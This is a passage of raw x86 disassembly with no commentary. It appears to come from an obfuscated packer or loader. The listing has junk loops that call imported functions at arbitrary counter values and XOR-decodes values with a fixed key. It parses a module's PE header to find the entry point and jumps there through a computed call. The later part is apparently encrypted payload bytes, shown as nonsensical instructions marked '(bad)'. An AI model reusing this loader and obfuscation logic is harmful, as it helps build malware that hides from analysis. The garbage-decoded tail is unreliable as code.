  409dcc:	mov    DWORD PTR ds:0x43429a,ecx
  409dd2:	cmp    DWORD PTR ds:0x43429a,0x10
  409dd9:	jae    0x409e48
  409ddf:	cmp    DWORD PTR ds:0x43429a,0x13
  409de6:	jne    0x409dfc
  409dec:	push   0x432733
  409df1:	push   0x432618
  409df6:	call   DWORD PTR ds:0x432bfe
  409dfc:	jmp    0x409dc5
  409e01:	and    DWORD PTR ds:0x4342a2,0x0
  409e0b:	mov    ecx,DWORD PTR ds:0x4342a2
  409e11:	inc    ecx
  409e12:	mov    DWORD PTR ds:0x4342a2,ecx
  409e18:	cmp    DWORD PTR ds:0x4342a2,0x20
  409e1f:	jne    0x409e3b
  409e25:	push   DWORD PTR [ebp-0x1c]
  409e28:	push   DWORD PTR [ebp-0x10]
  409e2b:	push   0x1942
  409e30:	push   0x6344
  409e35:	call   DWORD PTR ds:0x432c02
  409e3b:	cmp    DWORD PTR ds:0x4342a2,0x1e
  409e42:	jb     0x409e0b
  409e48:	lea    eax,[ebp-0x18]
  409e4b:	sub    DWORD PTR ds:0x43432d,0x379b
  409e55:	mov    DWORD PTR [ebp-0x14],eax
  409e58:	lea    eax,[ebp-0x1c]
  409e5b:	and    DWORD PTR ds:0x432600,0x0
  409e65:	mov    ecx,DWORD PTR ds:0x432600
  409e6b:	inc    ecx
  409e6c:	mov    DWORD PTR ds:0x432600,ecx
  409e72:	cmp    DWORD PTR ds:0x432600,0x20
  409e79:	jne    0x409e98
  409e7f:	push   DWORD PTR [ebp-0xc]
  409e82:	push   DWORD PTR [ebp-0x10]
  409e85:	push   0x37d5
  409e8a:	push   0x73f1
  409e8f:	push   DWORD PTR [ebp-0x1c]
  409e92:	call   DWORD PTR ds:0x4328d6
  409e98:	cmp    DWORD PTR ds:0x432600,0x18
  409e9f:	jb     0x409e65
  409ea5:	and    DWORD PTR ds:0x4325ec,0x0
  409eaf:	mov    ecx,DWORD PTR ds:0x4325ec
  409eb5:	inc    ecx
  409eb6:	mov    DWORD PTR ds:0x4325ec,ecx
  409ebc:	cmp    DWORD PTR ds:0x4325ec,0x19
  409ec3:	jne    0x409ed4
  409ec9:	push   0x477f
  409ece:	call   DWORD PTR ds:0x4328da
  409ed4:	cmp    DWORD PTR ds:0x4325ec,0x13
  409edb:	jb     0x409eaf
  409ee1:	mov    ecx,DWORD PTR ds:0x432cd6
  409ee7:	xor    DWORD PTR ds:0x43429e,ecx
  409eed:	mov    DWORD PTR [ebp-0xc],eax
  409ef0:	and    DWORD PTR ds:0x4325f4,0x0
  409efa:	jmp    0x409f0d
  409eff:	xor    eax,eax
  409f01:	add    eax,DWORD PTR ds:0x4325f4
  409f07:	inc    eax
  409f08:	mov    ds:0x4325f4,eax
  409f0d:	cmp    DWORD PTR ds:0x4325f4,0x1a
  409f14:	jae    0x409f4f
  409f1a:	cmp    DWORD PTR ds:0x4325f4,0x21
  409f21:	jne    0x409f4a
  409f27:	push   0x432ce6
  409f2c:	push   DWORD PTR [ebp-0x28]
  409f2f:	push   DWORD PTR [ebp-0x18]
  409f32:	push   0x87ba
  409f37:	push   0x20df
  409f3c:	push   0x519b
  409f41:	push   DWORD PTR [ebp-0x18]
  409f44:	call   DWORD PTR ds:0x432c06
  409f4a:	jmp    0x409eff
  409f4f:	mov    eax,ds:0x4161a0
  409f54:	mov    DWORD PTR ds:0x4325f4,0x19
  409f5e:	cmp    DWORD PTR ds:0x4325f4,0x0
  409f65:	je     0x409fb2
  409f6b:	cmp    DWORD PTR ds:0x4325f4,0x21
  409f72:	jne    0x409fa0
  409f78:	push   0x2812
  409f7d:	push   0x6a58
  409f82:	push   DWORD PTR [ebp-0x24]
  409f85:	push   0x8f98
  409f8a:	push   DWORD PTR [ebp-0x20]
  409f8d:	push   0x26e4
  409f92:	push   DWORD PTR [ebp-0x14]
  409f95:	push   0x4327ab
  409f9a:	call   DWORD PTR ds:0x432c0a
  409fa0:	mov    ecx,DWORD PTR ds:0x4325f4
  409fa6:	dec    ecx
  409fa7:	mov    DWORD PTR ds:0x4325f4,ecx
  409fad:	jmp    0x409f5e
  409fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  409fb8:	xor    DWORD PTR ds:0x4325f4,edx
  409fbe:	mov    eax,DWORD PTR [eax]
  409fc0:	mov    ecx,DWORD PTR [ebp-0xc]
  409fc3:	add    DWORD PTR ds:0x4325f0,0x3eda
  409fcd:	push   esi
  409fce:	mov    esi,0x7510855
  409fd3:	sbb    DWORD PTR ds:0x434315,0x118a
  409fdd:	xor    eax,esi
  409fdf:	sbb    DWORD PTR ds:0x43428e,0x43427a
  409fe9:	push   edi
  409fea:	xor    edi,DWORD PTR ds:0x43428a
  409ff0:	mov    edi,0x32729c
  409ff5:	adc    DWORD PTR ds:0x434315,0x7b86
  409fff:	add    eax,edi
  40a001:	mov    DWORD PTR [ecx],eax
  40a003:	mov    eax,ds:0x4163b4
  40a008:	mov    DWORD PTR ds:0x432cde,0x674a
  40a012:	cmp    eax,0x23c13046
  40a017:	mov    eax,DWORD PTR [ebp-0x4]
  40a01a:	je     0x40a046
  40a020:	mov    ecx,DWORD PTR [ebp-0x8]
  40a023:	xor    eax,esi
  40a025:	sub    DWORD PTR ds:0x4325f4,0x7cc4
  40a02f:	add    eax,edi
  40a031:	add    DWORD PTR ds:0x434286,0x4325f4
  40a03b:	imul   eax,ecx
  40a03e:	mov    DWORD PTR [ebp-0x8],eax
  40a041:	jmp    0x40a156
  40a046:	and    DWORD PTR ds:0x432cde,0x0
  40a050:	mov    ecx,DWORD PTR ds:0x432cde
  40a056:	inc    ecx
  40a057:	mov    DWORD PTR ds:0x432cde,ecx
  40a05d:	cmp    DWORD PTR ds:0x432cde,0x26
  40a064:	jne    0x40a07d
  40a06a:	push   DWORD PTR [ebp-0x18]
  40a06d:	push   0x709e
  40a072:	push   0x1359
  40a077:	call   DWORD PTR ds:0x432c0e
  40a07d:	cmp    DWORD PTR ds:0x432cde,0x19
  40a084:	jb     0x40a050
  40a08a:	xor    eax,esi
  40a08c:	and    DWORD PTR ds:0x434296,0x0
  40a096:	mov    ecx,DWORD PTR ds:0x434296
  40a09c:	inc    ecx
  40a09d:	mov    DWORD PTR ds:0x434296,ecx
  40a0a3:	cmp    DWORD PTR ds:0x434296,0x10
  40a0aa:	jne    0x40a0c0
  40a0b0:	push   0x432705
  40a0b5:	push   0x43271d
  40a0ba:	call   DWORD PTR ds:0x4328de
  40a0c0:	cmp    DWORD PTR ds:0x434296,0xf
  40a0c7:	jne    0x40a0da
  40a0cd:	mov    ecx,DWORD PTR ds:0x434296
  40a0d3:	inc    ecx
  40a0d4:	mov    DWORD PTR ds:0x434296,ecx
  40a0da:	cmp    DWORD PTR ds:0x434296,0x1e
  40a0e1:	jb     0x40a096
  40a0e7:	add    eax,edi
  40a0e9:	mov    ds:0x4162b0,eax
  40a0ee:	mov    ecx,DWORD PTR ds:0x434266
  40a0f4:	sbb    DWORD PTR ds:0x434315,ecx
  40a0fa:	mov    eax,DWORD PTR [ebp-0x8]
  40a0fd:	sbb    ecx,DWORD PTR ds:0x432cd6
  40a103:	xor    eax,esi
  40a105:	not    ecx
  40a107:	add    eax,edi
  40a109:	mov    ds:0x4163b4,eax
  40a10e:	mov    eax,DWORD PTR [ebp-0x4]
  40a111:	mov    ecx,DWORD PTR ds:0x4162b0
  40a117:	sub    DWORD PTR ds:0x4325f0,0x434315
  40a121:	xor    eax,esi
  40a123:	add    eax,edi
  40a125:	mov    DWORD PTR ds:0x434292,0x307
  40a12f:	cmp    ecx,eax
  40a131:	jne    0x40a156
  40a137:	xor    DWORD PTR ds:0x432cce,0x57b5
  40a141:	push   DWORD PTR [ebp-0x4]
  40a144:	sub    DWORD PTR ds:0x434319,0x6bc5
  40a14e:	push   DWORD PTR [ebp-0x8]
  40a151:	call   0x40a47c
  40a156:	mov    eax,ds:0x4161a0
  40a15b:	mov    eax,DWORD PTR [eax+0x18c]
  40a161:	xor    ecx,ecx
  40a163:	mov    eax,DWORD PTR [eax]
  40a165:	sbb    DWORD PTR ds:0x434311,edx
  40a16b:	mov    DWORD PTR [ebp-0x20],eax
  40a16e:	inc    edx
  40a16f:	mov    eax,0xf89c853d
  40a174:	mov    DWORD PTR [ebp-0x24],eax
  40a177:	or     DWORD PTR ds:0x43426a,edx
  40a17d:	mov    DWORD PTR [ebp-0x24],eax
  40a180:	and    DWORD PTR ds:0x43429a,0x0
  40a18a:	jmp    0x40a19c
  40a18f:	mov    edx,DWORD PTR ds:0x43429a
  40a195:	inc    edx
  40a196:	mov    DWORD PTR ds:0x43429a,edx
  40a19c:	cmp    DWORD PTR ds:0x43429a,0x10
  40a1a3:	jae    0x40a1f4
  40a1a9:	cmp    DWORD PTR ds:0x43429a,0x6
  40a1b0:	jne    0x40a1d3
  40a1b6:	push   0x1088
  40a1bb:	push   DWORD PTR [ebp-0x1c]
  40a1be:	push   0x185d
  40a1c3:	push   0x432809
  40a1c8:	push   0x400000
  40a1cd:	call   DWORD PTR ds:0x4328e2
  40a1d3:	cmp    DWORD PTR ds:0x43429a,0x5
  40a1da:	jne    0x40a1ef
  40a1e0:	xor    edx,edx
  40a1e2:	or     edx,DWORD PTR ds:0x43429a
  40a1e8:	inc    edx
  40a1e9:	mov    DWORD PTR ds:0x43429a,edx
  40a1ef:	jmp    0x40a18f
  40a1f4:	mov    DWORD PTR [ebp-0x24],eax
  40a1f7:	mov    DWORD PTR [ebp-0xc],ebx
  40a1fa:	mov    DWORD PTR [ebp-0x24],eax
  40a1fd:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40a204:	mov    ebx,DWORD PTR [ebp-0x8]
  40a207:	and    edx,DWORD PTR ds:0x43429a
  40a20d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a210:	and    DWORD PTR ds:0x432cce,0x0
  40a21a:	mov    edx,DWORD PTR ds:0x432cce
  40a220:	inc    edx
  40a221:	mov    DWORD PTR ds:0x432cce,edx
  40a227:	cmp    DWORD PTR ds:0x432cce,0x22
  40a22e:	jne    0x40a23a
  40a234:	call   DWORD PTR ds:0x4328e6
  40a23a:	cmp    DWORD PTR ds:0x432cce,0x17
  40a241:	jb     0x40a21a
  40a247:	mov    edx,DWORD PTR [ebp-0x4]
  40a24a:	xor    edx,esi
  40a24c:	xor    ecx,esi
  40a24e:	add    ecx,edx
  40a250:	mov    edx,DWORD PTR [ebp-0x4]
  40a253:	xor    ebx,esi
  40a255:	xor    edx,esi
  40a257:	add    ebx,edi
  40a259:	lea    ecx,[ecx+edx*1+0x9757d4]
  40a260:	cmp    ebx,ecx
  40a262:	ja     0x40a2c3
  40a268:	mov    eax,DWORD PTR [ebp-0x4]
  40a26b:	xor    eax,esi
  40a26d:	lea    eax,[eax+ebx*1+0x32729c]
  40a274:	push   eax
  40a275:	mov    eax,DWORD PTR [ebp-0xc]
  40a278:	xor    eax,esi
  40a27a:	lea    eax,[ebp+eax*1+0x3272a4]
  40a281:	push   eax
  40a282:	mov    eax,ds:0x4161a0
  40a287:	push   DWORD PTR [eax+0x1bc]
  40a28d:	call   0x401a05
  40a292:	mov    eax,DWORD PTR [ebp-0x4]
  40a295:	xor    eax,esi
  40a297:	lea    ebx,[ebx+eax*1+0x32729c]
  40a29e:	mov    eax,DWORD PTR [ebp-0x4]
  40a2a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a4:	xor    ecx,esi
  40a2a6:	xor    eax,esi
  40a2a8:	add    eax,ecx
  40a2aa:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2ad:	xor    ecx,esi
  40a2af:	lea    eax,[eax+ecx*1+0x9757d4]
  40a2b6:	cmp    ebx,eax
  40a2b8:	jbe    0x40a268
  40a2be:	mov    eax,0xf89c853d
  40a2c3:	mov    ecx,DWORD PTR [ebp+0xc]
  40a2c6:	mov    DWORD PTR ds:0x416024,ecx
  40a2cc:	mov    ecx,DWORD PTR [ebp+0x10]
  40a2cf:	mov    DWORD PTR ds:0x416278,ecx
  40a2d5:	mov    ecx,DWORD PTR ds:0x416024
  40a2db:	mov    edx,DWORD PTR [ebp-0x14]
  40a2de:	sub    ecx,edi
  40a2e0:	xor    ecx,esi
  40a2e2:	mov    DWORD PTR [edx],ecx
  40a2e4:	mov    ecx,DWORD PTR [ebp-0x18]
  40a2e7:	cmp    ecx,0xf89c8530
  40a2ed:	je     0x40a34a
  40a2f3:	mov    ecx,DWORD PTR [ebp-0x8]
  40a2f6:	mov    edx,DWORD PTR [ebp-0x1c]
  40a2f9:	xor    ecx,esi
  40a2fb:	add    ecx,edi
  40a2fd:	cmp    ecx,edx
  40a2ff:	je     0x40a34a
  40a305:	mov    eax,ds:0x4161a0
  40a30a:	mov    eax,DWORD PTR [eax+0x194]
  40a310:	mov    ecx,DWORD PTR [eax]
  40a312:	mov    eax,DWORD PTR [ecx+0x3c]
  40a315:	push   DWORD PTR ds:0x416278
  40a31b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a31f:	push   DWORD PTR ds:0x416024
  40a325:	add    eax,ecx
  40a327:	mov    ecx,DWORD PTR ds:0x4161a0
  40a32d:	mov    ecx,DWORD PTR [ecx+0x194]
  40a333:	push   DWORD PTR [ecx]
  40a335:	call   eax
  40a337:	mov    ecx,DWORD PTR ds:0x4161a0
  40a33d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a343:	mov    DWORD PTR [ecx],eax
  40a345:	jmp    0x40a45a
  40a34a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34d:	mov    edx,DWORD PTR [ebp-0x20]
  40a350:	xor    ecx,esi
  40a352:	add    ecx,edi
  40a354:	cmp    ecx,edx
  40a356:	jne    0x40a43d
  40a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a35f:	xor    ecx,esi
  40a361:	add    ecx,edi
  40a363:	mov    DWORD PTR ds:0x416224,ecx
  40a369:	mov    ecx,DWORD PTR [ebp-0x8]
  40a36c:	xor    ecx,esi
  40a36e:	add    ecx,edi
  40a370:	mov    DWORD PTR ds:0x41621c,ecx
  40a376:	mov    ecx,DWORD PTR [ebp-0x4]
  40a379:	mov    DWORD PTR [ebp-0xc],ecx
  40a37c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a37f:	mov    DWORD PTR [ebp+0xc],ecx
  40a382:	mov    ecx,DWORD PTR [ebp+0xc]
  40a385:	xor    ecx,esi
  40a387:	add    ecx,edi
  40a389:	mov    DWORD PTR [ebp+0xc],ecx
  40a38c:	mov    ecx,DWORD PTR ds:0x416020
  40a392:	mov    ecx,DWORD PTR [ecx]
  40a394:	mov    DWORD PTR [ebp+0xc],ecx
  40a397:	mov    ecx,DWORD PTR ds:0x416228
  40a39d:	mov    ecx,DWORD PTR [ecx]
  40a39f:	mov    DWORD PTR [ebp-0x14],ecx
  40a3a2:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40a3a9:	mov    ecx,DWORD PTR [ebp+0x10]
  40a3ac:	xor    ecx,esi
  40a3ae:	add    ecx,edi
  40a3b0:	mov    DWORD PTR [ebp+0x10],ecx
  40a3b3:	mov    ecx,DWORD PTR ds:0x4161a0
  40a3b9:	mov    DWORD PTR [ebp+0x10],ecx
  40a3bc:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3bf:	mov    DWORD PTR [ebp+0xc],ecx
  40a3c2:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3c5:	push   0x4
  40a3c7:	pop    edx
  40a3c8:	sub    edx,ecx
  40a3ca:	add    edx,DWORD PTR [ebp-0x14]
  40a3cd:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40a3d4:	mov    DWORD PTR [ebp+0x10],edx
  40a3d7:	mov    DWORD PTR [ebp-0x70],eax
  40a3da:	mov    eax,DWORD PTR [ebp+0xc]
  40a3dd:	mov    DWORD PTR [ebp-0x6c],eax
  40a3e0:	mov    eax,DWORD PTR [ebp+0x10]
  40a3e3:	mov    DWORD PTR [ebp-0x68],eax
  40a3e6:	mov    eax,DWORD PTR [ebp-0x24]
  40a3e9:	xor    eax,esi
  40a3eb:	add    eax,edi
  40a3ed:	mov    DWORD PTR [ebp-0x64],eax
  40a3f0:	lea    eax,[ebp-0x2c]
  40a3f3:	mov    DWORD PTR [ebp-0x60],eax
  40a3f6:	mov    eax,DWORD PTR [ebp-0x70]
  40a3f9:	xor    eax,esi
  40a3fb:	add    eax,edi
  40a3fd:	mov    DWORD PTR [ebp-0x70],eax
  40a400:	lea    eax,[ebp-0x70]
  40a403:	push   eax
  40a404:	mov    eax,DWORD PTR [ebp-0xc]
  40a407:	xor    eax,esi
  40a409:	add    eax,edi
  40a40b:	push   eax
  40a40c:	mov    eax,ds:0x4161c0
  40a411:	push   0x416116
  40a416:	push   DWORD PTR [eax]
  40a418:	call   0x40d076
  40a41d:	xor    esi,esi
  40a41f:	mov    eax,DWORD PTR [ebp+0x10]
  40a422:	sub    eax,esi
  40a424:	push   eax
  40a425:	mov    eax,DWORD PTR [ebp+0xc]
  40a428:	add    eax,esi
  40a42a:	push   eax
  40a42b:	call   0x407765
  40a430:	inc    esi
  40a431:	cmp    esi,0x52
  40a434:	jb     0x40a41f
  40a43a:	mov    eax,DWORD PTR [ebp-0xc]
  40a43d:	call   0x405bf4
  40a442:	lea    eax,[ebp+0x4]
  40a445:	mov    DWORD PTR [ebp-0x28],eax
  40a448:	mov    eax,DWORD PTR [ebp-0x10]
  40a44b:	mov    eax,DWORD PTR [ebp-0x4]
  40a44e:	push   DWORD PTR [ebp-0x8]
  40a451:	lea    eax,[ebp-0x28]
  40a454:	push   eax
  40a455:	call   0x40c78b
  40a45a:	mov    eax,ds:0x4161a0
  40a45f:	push   0x4
  40a461:	add    eax,0x1cc
  40a466:	push   eax
  40a467:	lea    eax,[ebp-0x10]
  40a46a:	push   eax
  40a46b:	call   0x401a05
  40a470:	mov    eax,DWORD PTR [ebp-0x10]
  40a473:	mov    eax,DWORD PTR [eax]
  40a475:	pop    edi
  40a476:	pop    esi
  40a477:	pop    ebx
  40a478:	leave  
  40a479:	ret    0xc
  40a47c:	push   ebp
  40a47d:	mov    ebp,esp
  40a47f:	sub    esp,0x24
  40a482:	xor    ecx,ecx
  40a484:	or     ecx,DWORD PTR ds:0x434325
  40a48a:	sub    ecx,DWORD PTR ds:0x43432d
  40a490:	mov    DWORD PTR ds:0x434325,ecx
  40a496:	mov    eax,ds:0x4161a0
  40a49b:	mov    DWORD PTR ds:0x434292,0x17
  40a4a5:	cmp    DWORD PTR ds:0x434292,0x0
  40a4ac:	je     0x40a506
  40a4b2:	cmp    DWORD PTR ds:0x434292,0x5
  40a4b9:	jne    0x40a4d4
  40a4bf:	push   0x378d
  40a4c4:	push   0x43427a
  40a4c9:	push   0x4a36
  40a4ce:	call   DWORD PTR ds:0x432b56
  40a4d4:	cmp    DWORD PTR ds:0x434292,0x6
  40a4db:	jne    0x40a4ee
  40a4e1:	mov    ecx,DWORD PTR ds:0x434292
  40a4e7:	dec    ecx
  40a4e8:	mov    DWORD PTR ds:0x434292,ecx
  40a4ee:	mov    ecx,DWORD PTR ds:0x434292
  40a4f4:	dec    ecx
  40a4f5:	mov    DWORD PTR ds:0x434292,ecx
  40a4fb:	jmp    0x40a4a5
  40a500:	add    DWORD PTR ds:0x432ce6,edx
  40a506:	mov    eax,DWORD PTR [eax+0x198]
  40a50c:	mov    ecx,DWORD PTR ds:0x434365
  40a512:	mov    ecx,DWORD PTR [ecx]
  40a514:	sub    DWORD PTR ds:0x434272,ecx
  40a51a:	mov    DWORD PTR [ebp-0x8],eax
  40a51d:	xor    eax,eax
  40a51f:	add    eax,DWORD PTR ds:0x434266
  40a525:	and    eax,DWORD PTR ds:0x4325f4
  40a52b:	mov    ds:0x434266,eax
  40a530:	mov    eax,DWORD PTR [ebp+0x8]
  40a533:	mov    ecx,DWORD PTR [ebp-0x8]
  40a536:	sub    DWORD PTR ds:0x432cde,0x4325f0
  40a540:	push   ebx
  40a541:	adc    DWORD PTR ds:0x434296,ebx
  40a547:	push   esi
  40a548:	mov    esi,0x7510855
  40a54d:	and    DWORD PTR ds:0x432cca,0x0
  40a557:	mov    ebx,DWORD PTR ds:0x432cca
  40a55d:	inc    ebx
  40a55e:	mov    DWORD PTR ds:0x432cca,ebx
  40a564:	cmp    DWORD PTR ds:0x432cca,0x2c
  40a56b:	jne    0x40a57a
  40a571:	push   DWORD PTR [ebp-0xc]
  40a574:	call   DWORD PTR ds:0x432b5a
  40a57a:	cmp    DWORD PTR ds:0x432cca,0x1e
  40a581:	jb     0x40a557
  40a587:	xor    eax,esi
  40a589:	and    DWORD PTR ds:0x4342a2,0x0
  40a593:	jmp    0x40a5a5
  40a598:	mov    ebx,DWORD PTR ds:0x4342a2
  40a59e:	inc    ebx
  40a59f:	mov    DWORD PTR ds:0x4342a2,ebx
  40a5a5:	cmp    DWORD PTR ds:0x4342a2,0x1a
  40a5ac:	jae    0x40a78c
  40a5b2:	cmp    DWORD PTR ds:0x4342a2,0x1d
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x74a9
  40a5c4:	push   0x3c30
  40a5c9:	call   DWORD PTR ds:0x432b5e
  40a5cf:	jmp    0x40a598
  40a5d4:	jmp    0x40a78c
  40a5d9:	cmp    dh,BYTE PTR [esi+0x69734bd3]
  40a5df:	inc    edx
  40a5e0:	mov    ch,0x74
  40a5e2:	neg    DWORD PTR [ebx-0x6]
  40a5e5:	aas    
  40a5e6:	(bad)  
  40a5e7:	sbb    eax,DWORD PTR [ecx]
  40a5e9:	shl    al,cl
  40a5eb:	jo     0x40a65d
  40a5ed:	xchg   ebp,eax
  40a5ee:	jg     0x40a660
  40a5f0:	jo     0x40a59a
  40a5f2:	add    al,0xe8
  40a5f4:	les    edx,FWORD PTR [ebp-0x5c1dae09]
  40a5fa:	sub    BYTE PTR ds:0xfd652b56,al
  40a600:	jg     0x40a5f3
  40a602:	or     bh,BYTE PTR [ebx+0x71fdbb80]
  40a608:	popf   
  40a609:	lods   eax,DWORD PTR ds:[esi]
  40a60a:	pop    ebx
  40a60b:	pop    edi
  40a60c:	lds    esi,FWORD PTR [ebp+0x70]
  40a60f:	out    0xfe,eax
  40a611:	xchg   esi,eax
  40a612:	daa    
  40a613:	mov    eax,0x335e24de
  40a618:	sbb    bl,bh
  40a61a:	pushf  
  40a61b:	aad    0x56
  40a61d:	fs inc esi
  40a61f:	int3   
  40a620:	mov    DWORD PTR [ebx+0x3ee264e6],edx
  40a626:	jle    0x40a603
  40a628:	xor    BYTE PTR [ecx-0x2bb417dd],bl
  40a62e:	jns    0x40a6a4
  40a630:	mov    dl,0x41
  40a632:	mov    bh,bl
  40a634:	xchg   ebp,eax
  40a635:	retf   0x2875
  40a638:	jle    0x40a5ee
  40a63a:	das    
  40a63b:	xchg   ebx,eax
  40a63c:	dec    eax
  40a63d:	imul   eax,edi,0xffffff89
  40a640:	xchg   esp,eax
  40a641:	fcomp  QWORD PTR [ebx]
  40a643:	ret    
  40a644:	ficomp WORD PTR [edi+edx*8]
  40a647:	jae    0x40a6c7
  40a649:	xor    eax,0x544f8ad6
  40a64e:	stc    
  40a64f:	lods   eax,DWORD PTR ds:[esi]
  40a650:	mul    DWORD PTR [edx]
  40a652:	fimul  WORD PTR [edi]
  40a654:	popf   
  40a655:	push   esi
  40a656:	aad    0x12
  40a658:	push   ss
  40a659:	in     al,0xf0
  40a65b:	in     eax,0x9b
  40a65d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a65e:	dec    eax
  40a65f:	das    
  40a660:	mov    ah,0x1a
  40a662:	cmp    BYTE PTR [eax+0x7a1118ae],0x6d
  40a669:	je     0x40a6c5
  40a66b:	in     al,dx
  40a66c:	sbb    edi,0x7b354073
  40a672:	cmp    esp,DWORD PTR [edx]
  40a674:	and    al,0x3
  40a676:	xchg   ebx,eax
  40a677:	mov    ch,0xd8
  40a679:	mov    esp,DWORD PTR [edi]
  40a67b:	mov    ebp,0xa1293f40
  40a680:	std    
  40a681:	or     BYTE PTR [ebp+0x2f],al
  40a684:	jp     0x40a608
  40a686:	jns    0x40a6a0
  40a688:	loop   0x40a67a
  40a68a:	sti    
  40a68b:	lds    ecx,FWORD PTR [esp+ecx*4-0x739d2322]
  40a692:	shl    BYTE PTR [eax+edi*1+0x4a37750],0x89
  40a69a:	push   ebx
  40a69b:	xlat   BYTE PTR ds:[ebx]
  40a69c:	and    eax,0x8b53e9a7
  40a6a1:	cwde   
  40a6a2:	add    al,0xda
  40a6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6a5:	dec    ebx
  40a6a6:	push   esi
  40a6a7:	and    DWORD PTR [esi+0x73537b61],0xffffffa9
  40a6ae:	jne    0x40a69d
  40a6b0:	jno    0xb914e848
  40a6b6:	loopne 0x40a6cd
  40a6b8:	lahf   
  40a6b9:	int    0x73
  40a6bb:	call   0x33b4:0xdc7cadba
  40a6c2:	scas   al,BYTE PTR es:[edi]
  40a6c3:	adc    edi,DWORD PTR [ebx]
  40a6c5:	push   es
  40a6c6:	outs   dx,WORD PTR ds:[esi]
  40a6c8:	ret    0xf8fd
  40a6cb:	sbb    BYTE PTR [esi-0x34699bb5],0xf7
  40a6d2:	sub    DWORD PTR [edi+eax*4],eax
  40a6d5:	sar    BYTE PTR [edx+ecx*2],0x16
  40a6d9:	pop    edx
  40a6da:	sar    DWORD PTR [ebx-0x517070af],1
  40a6e0:	mov    bl,0xc2
  40a6e2:	mov    ch,0xf1
  40a6e4:	pop    ds
  40a6e5:	mov    eax,0x3ede081e
  40a6ea:	push   ebp
  40a6eb:	stos   BYTE PTR es:[edi],al
  40a6ec:	bound  ebp,QWORD PTR [eax+eiz*4]
  40a6ef:	out    dx,al
  40a6f0:	jb     0x40a74c
  40a6f2:	xlat   BYTE PTR ds:[ebx]
  40a6f3:	adc    cl,BYTE PTR [esp+esi*4]
  40a6f6:	jge    0x40a72d
  40a6f8:	(bad)  
  40a6f9:	clc    
  40a6fa:	scas   al,BYTE PTR es:[edi]
  40a6fb:	xchg   edx,eax
  40a6fc:	(bad)  
  40a6fd:	cmp    DWORD PTR [esi+0x131eee06],edi
  40a703:	mov    ebp,0xde276252
  40a708:	inc    esp
  40a709:	mov    bh,0xf8
  40a70b:	pop    es
  40a70c:	sub    edx,esp
  40a70e:	push   esp
  40a70f:	add    eax,DWORD PTR [eax+ebx*2+0x3a]
  40a713:	sbb    al,0x11
  40a715:	fdivrp st(4),st
  40a717:	dec    esi
  40a718:	retf   
  40a719:	xchg   ebp,eax
  40a71a:	(bad)  
  40a71b:	test   al,0xcd
  40a71d:	mov    bl,0xf7
  40a71f:	mov    cl,0x7
  40a721:	push   0x32
  40a723:	leave  
  40a724:	push   esp
  40a725:	pop    edx
  40a726:	popa   
  40a727:	and    ah,BYTE PTR [ebx]
  40a729:	fs aaa 
  40a72b:	xchg   edx,eax
  40a72c:	add    ebx,ebx
  40a72e:	xor    DWORD PTR [eax],edx
  40a730:	jo     0x40a6bb
  40a732:	call   0x2d256a5a
  40a737:	dec    ebx
  40a738:	jp     0x40a6d7
  40a73a:	jne    0x40a78a
  40a73c:	sub    DWORD PTR [ebp-0x2c249216],ebp
  40a742:	adc    al,0x8b
  40a744:	adc    dh,BYTE PTR [esi-0xc69be25]
  40a74a:	add    eax,0xe1dd5d46
  40a74f:	push   ds
  40a750:	pop    esi
  40a751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a752:	mov    BYTE PTR [eax],al
  40a754:	adc    eax,0x3034b3d
  40a759:	icebp  
  40a75a:	jl     0x40a7b5
  40a75c:	ret    
  40a75d:	dec    eax
  40a75e:	add    ebx,DWORD PTR [ecx+0x2a]
  40a761:	fsubr  DWORD PTR [eax-0x3ea10236]
  40a767:	push   edx
  40a768:	loop   0x40a729
  40a76a:	cmp    dh,ah
  40a76c:	dec    esi
  40a76d:	aas    
  40a76e:	sbb    edi,eax
  40a770:	dec    edx
  40a771:	dec    edx
  40a772:	or     eax,0x99ac22db
  40a778:	xor    dh,BYTE PTR [ebx-0x323259ac]
  40a77e:	lea    edi,[ebx+0x44]
  40a781:	jae    0x40a788
  40a783:	outs   dx,BYTE PTR ds:[esi]
  40a784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a785:	nop
  40a786:	outs   dx,DWORD PTR ds:[esi]
  40a787:	sbb    bl,BYTE PTR [ebx+0x579784b5]
  40a78d:	jmp    0x40a945
  40a792:	mov    ah,0x79
  40a794:	jae    0x40a807
  40a796:	jno    0x40a809
  40a798:	mov    dl,0x39
  40a79a:	hlt    
  40a79b:	or     ebp,DWORD PTR [edx+ebp*2+0x12]
  40a79f:	idiv   BYTE PTR [ebx+0x6d]
  40a7a2:	ja     0x40a793
  40a7a4:	jo     0x40a816
  40a7a6:	xchg   ebp,eax
  40a7a7:	jg     0x40a819
  40a7a9:	jo     0x40a77a
  40a7ab:	or     ah,dl
  40a7ad:	test   BYTE PTR [eax+0x4],0xe5
  40a7b1:	pop    edi
  40a7b2:	not    BYTE PTR [ebp-0x1b]
  40a7b5:	int    0x2c
  40a7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7b8:	cwde   
  40a7b9:	aam    0x32
  40a7bb:	pop    es
  40a7bc:	xchg   edi,eax
  40a7bd:	out    0x1c,eax
  40a7bf:	jae    0x40a7b0
  40a7c1:	ret    
  40a7c2:	or     dh,BYTE PTR [eax-0x54dd2ec5]
  40a7c8:	push   ecx
  40a7c9:	test   eax,0xfe486343
  40a7ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7cf:	jp     0x40a82f
  40a7d1:	xor    al,BYTE PTR [ebx-0x612b11e0]
  40a7d7:	and    eax,0x99a154eb
